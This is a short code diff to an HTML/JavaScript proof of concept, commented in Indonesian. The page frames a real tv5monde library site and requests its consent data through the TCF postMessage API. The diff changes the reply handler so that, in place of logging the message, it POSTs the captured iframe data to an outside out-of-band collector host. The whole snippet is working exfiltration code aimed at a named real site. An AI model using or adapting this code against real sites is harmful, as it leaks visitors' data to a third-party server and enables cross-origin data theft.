@@ -14,13 +14,17 @@
 
 	frame.contentWindow.postMessage(
 	  { __tcfapiCall: { command: "getTCData", parameter: null, callId: 1 } },
-	  "*"  // atau spesifik: "https://bibliothequenumerique.tv5monde.com"
+	  "https://bibliothequenumerique.tv5monde.com"  // atau spesifik: "https://bibliothequenumerique.tv5monde.com"
 	)
 
 	// Tangkap balasannya
 	window.addEventListener("message", (e) => {
-	  console.log("Balasan dari iframe:", e.data)
-	})
+  // Kirim ke server kamu
+  fetch("https://d84asfsvkq3h314j4sbg8gkc1utah3xn5.oast.online/collect", {
+    method: "POST",
+    body: JSON.stringify(e.data)
+  })
+})
 </script>
 </body>
 </html>
